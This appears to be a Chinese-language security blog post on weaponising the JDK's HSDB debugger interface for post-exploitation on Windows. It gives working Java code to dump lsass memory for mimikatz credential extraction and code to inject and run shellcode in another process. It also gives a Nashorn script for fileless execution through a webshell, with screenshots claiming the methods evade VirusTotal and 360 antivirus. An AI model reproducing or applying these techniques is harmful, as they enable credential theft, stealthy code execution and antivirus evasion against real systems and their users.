# JVM HSDB在后渗透中的利用



<meta name="referrer" content="no-referrer" />



## 背景
HSDB（Hotspot Debugger)，是JDK自带的调试工具，可用于调试JVM 运行时数据。
最近在学习Beichen师傅《JVM核心对抗》PPT的时候，注意到提到了HSDB的一个玩法：利用其中的windbg调试接口进行dump lsass以及加载Shellcode操作，本文进行学习以及一些武器化利用扩展。
## dump lsass
> lsass是windows中处理本地安全和登录策略的重要进程，几乎所有的windows身份认证程序都离不开lsass进程。因此在lsass的内存中会保存用户相关的凭证。它是windows主机中凭证的重要组成部分，因此获取lsass内存也是MITRE ATT&CK框架中Credential Access战术下的重要技术点。


由于许多带签名的正常程序都需要用到内存dump功能，让用户能查看进程在内存中的信息，所以以往的对抗主要是通过一些常见的白进程签名程序，利用程序的正常功能来获取windows lsass中的内存。不过由于用得太多了，基本都已经被各大杀软所监控标记。今天的HSDB属于一个新的小众白名单利用。
核心原理是JVM在调试进程的时候，会调用windbg接口，并且支持输入自定义的windbg语句，从而实现dump lsass
具体代码
```
public static void dumper(int pid, String path) {
      WindbgDebuggerLocal debuggerLocal = new WindbgDebuggerLocal(new MachineDescriptionAMD64(), false);
      debuggerLocal.attach(pid);
      System.out.println(debuggerLocal.consoleExecuteCommand(".dump /ma " + path));
      debuggerLocal.detach();
  }
```
打包个jar运行，发现已经成功dump了lsass
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1698730877981-989fa672-787d-47ad-b48b-e4c421491302.png#averageHue=%232f3029&clientId=ud42243de-4178-4&from=paste&height=112&id=R0vHl&originHeight=224&originWidth=1648&originalType=binary&ratio=2&rotation=0&showTitle=false&size=220432&status=done&style=none&taskId=ueb886ba4-b040-4d9e-9f4a-7601b779bd5&title=&width=824)
然后用mimikatz dump出其中的凭证
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1698731011215-e666e691-1ced-4bb1-9e6f-07e4802358cb.png#averageHue=%232c2d27&clientId=ud42243de-4178-4&from=paste&height=453&id=u9d7def08&originHeight=906&originWidth=1764&originalType=binary&ratio=2&rotation=0&showTitle=false&size=733551&status=done&style=none&taskId=ue426a5c5-384d-4118-a94a-23325cf6063&title=&width=882)
VT 0/62
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1698733301130-93045bc5-f069-4399-a61f-4b9514a49621.png#averageHue=%23fdfdfc&clientId=ud42243de-4178-4&from=paste&height=659&id=x4tn5&originHeight=1318&originWidth=2632&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1561148&status=done&style=none&taskId=ufd4f2298-b45f-4327-9a45-16034facd00&title=&width=1316)
免杀360无告警
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1698738045044-21dfd2bc-5a50-4924-ac99-29f7bf1a8f30.png#averageHue=%23f0e7da&clientId=ud42243de-4178-4&from=paste&height=719&id=SQzbw&originHeight=1438&originWidth=1816&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1604191&status=done&style=none&taskId=ud63dff27-7cfd-4795-a8c6-84ce84d9525&title=&width=908)

为了对比测试，继续跑一下已经公开过的白利用。360告警拦截，dump提示拒绝访问。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1698738201229-bc82b876-27a7-4fc0-908d-ba107e6aaf9e.png#averageHue=%23a38a80&clientId=ud42243de-4178-4&from=paste&height=395&id=CFIsX&originHeight=790&originWidth=1462&originalType=binary&ratio=2&rotation=0&showTitle=false&size=756525&status=done&style=none&taskId=u41ef6e95-5d2e-48c2-aaaf-004bbc94295&title=&width=731)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1698738338808-22b73acc-06a1-4144-814e-71c1d69aa558.png#averageHue=%23090807&clientId=ud42243de-4178-4&from=paste&height=286&id=Biqsg&originHeight=572&originWidth=1448&originalType=binary&ratio=2&rotation=0&showTitle=false&size=392874&status=done&style=none&taskId=ua4118c8e-b830-43bf-8ee1-a1550523a65&title=&width=724)

## 加载ShellCode
windbg是一款很强大的调试工具，我们还可以利用该接口进行ShellCode的加载。基本流程：

- 申请内存
- 写入Shellcode
- 修改当前运行指针到Shellcode位置

Beichen师傅的PPT里没有贴写入Shellcode的实现代码，这里其实有很多种方式，我这里采用eb命令实现。其实用Unsafe也可以，但是Unsafe特征比较明显。
核心代码
```
public static void Runshellcode(int pid, String shellcode) {
      WindbgDebuggerLocal debuggerLocal = new WindbgDebuggerLocal(new MachineDescriptionAMD64(), false);
      debuggerLocal.attach(pid);
      System.out.println(shellcode.length());
      String result = debuggerLocal.consoleExecuteCommand(".dvalloc 10000");
      String addressToken = "starting at ";
      System.out.println(result);
      int index = result.indexOf(addressToken);
      String address = result.substring(index + addressToken.length()).trim();
      String s1 = debuggerLocal.consoleExecuteCommand("eb " + address + " " + hexFormat(shellcode));
      System.out.println(s1);
      String s2 = debuggerLocal.consoleExecuteCommand("r @$ip=" + address);
      System.out.println(s2);
      debuggerLocal.detach();
  }
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1698807444120-2cd766e8-1007-4fd8-abf5-9b7cac14c7f4.png#averageHue=%23f8f8f7&clientId=u3da0789b-e43b-4&from=paste&height=601&id=u637527b4&originHeight=1202&originWidth=2198&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1401804&status=done&style=none&taskId=u6039d039-cb9c-4964-9e71-1aeb1c4f2e8&title=&width=1099)
同样秒过3xx。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1698808051629-b992211f-eb1b-47b7-8a21-5929e2f6d0e7.png#averageHue=%23e4d9c7&clientId=u3da0789b-e43b-4&from=paste&height=808&id=uf8e27072&originHeight=1616&originWidth=1940&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1938729&status=done&style=none&taskId=u72a25947-6989-4649-8563-37b8858de8a&title=&width=970)
当然这里只是注入方式不被查杀，如果是cs或者msf还要改一下内存特征。
## 可能遇到的报错
必须是JDK下的jre运行才可以，否则可能会产生以下报错
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1698733438742-7fc8f7db-3a51-4277-a3c9-a5758914b0bf.png#averageHue=%232e2e28&clientId=ud42243de-4178-4&from=paste&height=156&id=ZE61R&originHeight=312&originWidth=2008&originalType=binary&ratio=2&rotation=0&showTitle=false&size=330354&status=done&style=none&taskId=u8f47058d-fca3-4f5d-86d0-783ff687943&title=&width=1004)
解决办法：复制jdk下的dll到对应目录下
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1698740221185-d21dbb6e-549b-4b67-9784-773a4f6bf986.png#averageHue=%23f5f4f3&clientId=ud42243de-4178-4&from=paste&height=253&id=XmAor&originHeight=506&originWidth=1364&originalType=binary&ratio=2&rotation=0&showTitle=false&size=354796&status=done&style=none&taskId=uc75219ae-4452-4015-855d-3d567a233a3&title=&width=682)
[https://blog.csdn.net/fl_zxf/article/details/42689569](https://blog.csdn.net/fl_zxf/article/details/42689569)
## 单文件执行
不同版本的sa-jdi可能不一样，如果选择jar方式的话要打包跟目标JDK环境一致的依赖，这样有点麻烦。
除了打一个jar包以外，还可以单文件执行
```
java -cp ".;c:\\xxxxx\\sa-jdi.jar" Exp
```
## As-Exploits无文件利用
想要在WebShell中利用需要满足两点：

1. 加载sa-jdi.jar到ClassLoader
2. 加载调用逻辑

对于第一点，sa-jdi.jar在JDK中默认存在，不需要额外上传，只需要用JarLoader功能加载一下就可以了
第二点，在As-Exploits 1.5中新增了JS引擎执行模块，这里我采用了JS引擎来实现功能的调用。（当然写个Class编译然后再defineClass加载也可以，稍微有点麻烦）
将payload改写为nashorn语法，跑一下看起来没问题
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1698732848154-0d8de35e-324c-490c-b6d9-2cbb16d1a6c8.png#averageHue=%23fafaf9&clientId=ud42243de-4178-4&from=paste&height=649&id=kS1A6&originHeight=1298&originWidth=2084&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1265444&status=done&style=none&taskId=ucac6650b-ff67-4e0f-90ec-9c4f950143a&title=&width=1042)
```
var windbg = Java.type("sun.jvm.hotspot.debugger.windbg.WindbgDebuggerLocal");
var desc = Java.type("sun.jvm.hotspot.debugger.MachineDescriptionAMD64");
var debuggerLocal = new windbg(new desc(), false);
debuggerLocal.attach(784);
java.lang.System.out.println(
  debuggerLocal.consoleExecuteCommand(".dump /ma ./dsds")
);
debuggerLocal.detach();

```
具体操作：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1699172636729-a4bc3281-9e97-45d6-ae26-26f8bddca5b7.png#averageHue=%23f6f6f6&clientId=u435397dc-e56a-4&from=paste&height=606&id=ud545900c&originHeight=757&originWidth=1078&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36397&status=done&style=none&taskId=u86fae59a-f65e-4e22-841d-53193f54c16&title=&width=862.4)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1699172728652-0f28a499-7749-40da-9d0d-0a443f421bad.png#averageHue=%23f4f4f4&clientId=u435397dc-e56a-4&from=paste&height=613&id=u8cb01b08&originHeight=766&originWidth=1065&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48285&status=done&style=none&taskId=u07a05dcc-9c63-4c3d-acb8-80314bba9c5&title=&width=852)
到目录界面看，dump文件已经生成了
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1699172850022-9b440520-cad1-44fb-b953-a920048efb4c.png#averageHue=%23cadef8&clientId=u435397dc-e56a-4&from=paste&height=40&id=u59d98925&originHeight=50&originWidth=933&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4098&status=done&style=none&taskId=uaac0df8c-569d-49a9-805d-b269c7ddac0&title=&width=746.4)
